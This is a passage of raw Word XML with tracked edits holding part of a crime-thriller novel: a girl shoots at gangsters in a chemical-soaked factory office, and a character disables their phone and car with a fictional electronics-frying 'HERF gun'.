          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A pretty awesome way to die, actually.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> And the kerosene barrel exploded, ripping Danny to shreds in a blast of steel and flame.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that didn’t actually happen.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barrel did, however, begin leaking its clear, pungent contents all over Danny’s </w:t>
      </w:r>
      <w:del w:id="2160" w:author="TextVet" w:date="2016-03-22T12:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003750D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">borrowed floral-print </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">sweatshirt. Kerosene poured </w:t>
      </w:r>
      <w:r w:rsidR="00D04470">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>like</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D04470">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a demon’s urine stream, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>forming an iridescent puddle on the concrete</w:t>
      </w:r>
      <w:ins w:id="2161" w:author="TextVet" w:date="2016-03-22T12:37:00Z">
        <w:r w:rsidR="00D04470">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> floor</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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rat-tat-tat</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of Julie’s firearm abated, and she bounded up the stairs. Eugene had stopped shooting. From the office room came the spinning clicks of a revolver cylinder and the ding of empty rounds upon the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Julie suddenly yelled, “Oh, you’re in trouble now!” She squeezed the trigger, and through the open doorway she sprayed the office wildly with aimless gunfire. Bullets tore into the floor, the walls, the desk, leaving gouges like claw</w:t>
      </w:r>
      <w:ins w:id="2162" w:author="TextVet" w:date="2016-03-22T12:41:00Z">
        <w:r w:rsidR="00100236">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marks from a wild beast.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office’s front door swung open. The two gangsters fled outside, crouching low to d</w:t>
      </w:r>
      <w:r w:rsidR="00100236">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>odge</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the girl’s gunfire, and slammed the heavy outer door shut behind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Julie continued firing, until finally the weapon’s bolt made an idle click and ceased moving. </w:t>
      </w:r>
      <w:r w:rsidR="008D7643">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">n abrupt silence </w:t>
      </w:r>
      <w:r w:rsidR="008D7643">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">closed around </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>its wake.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Realizing that she was out of ammunition, Julie wasted no time. She sprinted to the other side of the small office and twisted the front door’s deadbolts shut.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Outside, the men pounded against the front door and struggled with the locks, but they were seconds too late. They tried kicking it, bashing it, even shooting it, but the outer door wouldn’t yield.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2163" w:author="TextVet" w:date="2016-03-22T12:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F9293A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">The guard outside </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2164" w:author="TextVet" w:date="2016-03-22T12:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D6830">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sai</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2165" w:author="TextVet" w:date="2016-03-22T12:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F9293A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">d, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“Don’t bother, man</w:t>
      </w:r>
      <w:ins w:id="2166" w:author="TextVet" w:date="2016-03-22T12:46:00Z">
        <w:r w:rsidR="00F9293A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,” advise</w:t>
        </w:r>
        <w:r w:rsidR="00F9293A" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>d</w:t>
        </w:r>
        <w:r w:rsidR="00F9293A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> t</w:t>
        </w:r>
        <w:r w:rsidR="00F9293A" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he guard outside</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="2167" w:author="TextVet" w:date="2016-03-22T12:46:00Z">
        <w:r w:rsidR="00F9293A">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We made sure nobody could bust in. Your orders, remember?”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Eugene yelled, “God fucking </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2168" w:author="TextVet" w:date="2016-03-22T12:47:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>damn it</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Deshaun! You standing in alley the whole time? You don’t hear the shooting? You don’t think to come up here and help us maybe?”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guys told me to stay out here. I thought Rex had you covered. I heard screaming. I figured you were, you know, working them over.”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answered, “That screaming </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Rex.”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“Holy fuck. Guys, are you alright?”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I’m not alright,” Eugene grumbled. “Look what that girl did to my jacket! This is Italian custom-made lambskin! See here? Bullet graze. Here? Torn on glass. I swear to fucking God, that bitch is not making it out of there alive! I’ll tear that little whore’s throat out! I’ll kick her teeth in with my bare hands!”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said, “You kick with your hands, Zhenka?”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sputtered, “I… with my… Shut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Inside, Julie leaned against the metal door, breathing heavily. A huge grin consumed her face. “Woooooohoooooo!”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The rows of 55-gallon drums had served as a backstop for Eugene’s bullets. Most of them were leaking profusely, coating the floor of the factory in a mixture of kerosene and acetone. Styrofoam dissolved into thick bubbling puddles, filling the room with a soft hiss. </w:t>
      </w:r>
      <w:r w:rsidR="00A83364">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oaked in kerosene,</w:t>
      </w:r>
      <w:ins w:id="2169" w:author="TextVet" w:date="2016-03-22T12:51:00Z">
        <w:r w:rsidR="00A83364" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> Danny’s sweatshirt</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2170" w:author="TextVet" w:date="2016-03-22T12:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A83364">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felt damp and heavy</w:t>
      </w:r>
      <w:del w:id="2171" w:author="TextVet" w:date="2016-03-22T12:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002631DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> against his skin</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. The mixed stench of jet fuel and nail polish remover assaulted </w:t>
      </w:r>
      <w:ins w:id="2172" w:author="TextVet" w:date="2016-03-22T12:52:00Z">
        <w:r w:rsidR="002631DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>hi</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2173" w:author="TextVet" w:date="2016-03-22T12:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002631DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny’</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s nose and burned his lungs. It was growing progressively harder to breathe. His eyes stung.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struggled with some piece of furniture in the office. Rattling sounds echoed from upstairs. “Hey, you!” she called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“Me?”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poked her head out through the broken interior door. “Do me a favor. There’s this desk up here with a couple drawers that I want to get into. It’s locked.”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“Get the key,” she answered.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where?”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pointed toward the center of the room. Danny followed her finger.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was pointing at Rex’s body.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stomach lurched. He felt his pulse in his throat. His vision began to dim — the world became oddly flat as though projected on a screen. He gulped for air, but the searing mix of chemicals served only to make him feel even sicker.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for God’s sake,” Julie said. “Grow some fucking balls!”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shook his head just to stay conscious. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This isn’t real</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, he told himself. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This is just a video game. I’m at home right now, sitting on my nice comfy leather couch, in the middle of my 7.1 surround sound setup, in front of my 60” HDTV, playing a really awesome new game on my PlayStation. It’s very, very immersive.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maneuvered toward the body, feeling like he was detached and floating. Up close, he could tell by parallax that the acid-burned face model was rendered as a genuine triangle mesh with Bezier edge-smoothing rather than a more conventional programmatic shader, and he was deeply impressed by the PlayStation’s ability to handle such a high polygon count. He watched his hand before his eyes as it prodded blood-soaked pockets. Danny found a keychain with several keys, a Ford car remote, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>and a tiny plush Kurt Cobain doll. He added the keychain to his inventory. He then hurried to the stairs, eager to get up to the office and away from the noxious fumes that were depleting his health bar.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Up in the office, Julie and Jason were both waiting for him. Julie stood by the desk, impatiently wrestling with the locked drawer. Jason sat on the floor, looking green and pale — the irritant gases were hitting his middle-aged cardiopulmonary system hardest of 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fiddled with the keychain until he found a small brass key, suited for a desk. He unlocked the drawer and rifled through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anything good in there?” asked Julie.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answered Danny, “there’s this…” He withdrew a narrow metal box — an extra magazine for Julie’s gun. Slits in the magazine allowed Danny to see about fifty bullet cartridges stacked neatly inside.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nodded approvingly and took the ammunition. She began pulling and pressing on random parts of the gun, trying to figure out how to eject the empty magazine and replace it with the full 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this,” Danny said, slapping a large, heavy key onto the desk.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I’ve seen that before,” said Julie. “When they bring new equipment in. It’s for those big loading doors downstairs.”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checked on Jason, who seemed to be improving now that he was away from the spill of kerosene and acetone. The smell of the chemicals was less intense in the small office. From the bathroom came the whirring of an overhead ventilator.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turned to the computer on the desk and began searching for something they might be able to use to escape. An initial click-through of the desktop folders suggested that this computer probably contained nothing but pirated movies and amateur porn.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he searched, he heard the conversation in the alley below.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“Guys, we can get in just fine,” said the guard. “I have keys to that door up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replied, “And what? Waltz right in? Do we know how much iron they have?”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“No,” answered the guard guiltily.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“Fuck, Deshaun, you did not search them before they go in?” Sergey scolded. “Okay, I’m not sending anyone in there without head-to-toe armor. Is not worth losing another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guard suggested, “We could just crack the door open and lob a few grenades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grumbled, “That would break the vial.”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“Riot grenades, then,” said the guard. “Fill the place up with tear gas, choke ‘em out. Or flash-bangs — stun them, then blow them away before they know what the fuck’s going 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scoffed, “You think we have giant stash of grenades in our trunk, Deshaun? Oh sure! Welcome to Grenade Buffet! Twelve ninety-nine, all you can throw!”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Deshaun replied, “Guys, you want grenades? I can get you grenades. Just one call to my boys. Deliver in twenty minutes or less. My phone’s right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Back in the office, that last line piqued Danny’s interest. He abandoned the computer and, with HERF gun in hand, walked to the exterior wall, listening intently to try to triangulate exactly where the voices were coming from.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“Put your phone away!” Eugene ordered.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ain’t a big deal, man” the guard said. “A dude owes me a favor.”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flipped a switch. Small fans whirred to life.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not the point!” Eugene insisted. “Put it away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okay…” said Deshaun. “But I don’t…”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Inside the office, there was a soft “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bonk!</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In the alley, there was a </w:t>
      </w:r>
      <w:commentRangeStart w:id="2174"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>crack</w:t>
      </w:r>
      <w:ins w:id="2175" w:author="TextVet" w:date="2016-03-22T13:01:00Z">
        <w:r w:rsidR="004A4B2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2174"/>
      <w:r w:rsidR="003B2EC3">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2174"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>g sound.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“Ow!” yelled Deshaun. “What the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fuck</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broken cellphone clattered to the ground.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groaned, “Fucking great. Told you so!”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HERF gun emitted a quiet, high-pitched whine as its capacitors recharged.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Below, Sergey started coughing and rumbling.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“Seryozha! Are you alright?” asked Eugene.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Sergey cleared his throat forcefully, sounding like a whinnying horse. “I’m fine. Shut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Deshaun barked, “The fuck happened to my phone,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nerdy guy has some kind of electronics gun,” said Eugene. “It kills cellphones.”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added, “And cars. That asshole destroyed my Roadster.”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just because it was electric, I think,” Eugene said. “It won’t work on all cars. My Beamer should be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“Even with all its little extras?” said Sergey, his voice still hoarse.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little extras?” Eugene asked defensively.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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Yes, what little extras?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> thought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“All the options you always brag about,” Sergey said. “When you buy that thing, you come to me saying, ‘Oh, uncle, look at fancy new toy! She is with the remote ignition, she is with the satellite radio, she is with the GPS, she is with the BMW Assist plan…’</w:t>
      </w:r>
      <w:ins w:id="2176" w:author="TextVet" w:date="2016-03-22T13:04:00Z">
        <w:r w:rsidR="00CA2E09">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00566952" w:rsidRPr="00566952">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="2177" w:author="TextVet" w:date="2016-03-22T13:04:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>Those</w:t>
        </w:r>
        <w:r w:rsidR="00CA2E09">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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>She is with the spectrum profile of a symphony orchestra</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Danny thought. He checked the HERF gun’s lamps. They were green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mumbled, “Shit, you think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a low “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bonk!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”, and a sharp crack from the alley below.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screamed, “Fuck, no no </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” A car door was flung open. “My Beamer! My beautiful brand new 650i Beamer!” Footsteps ran to the side of the alley with Jason’s Lincoln Navigator. You…” A shot rang out. “…God—” </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bang!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> “—damned…” </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
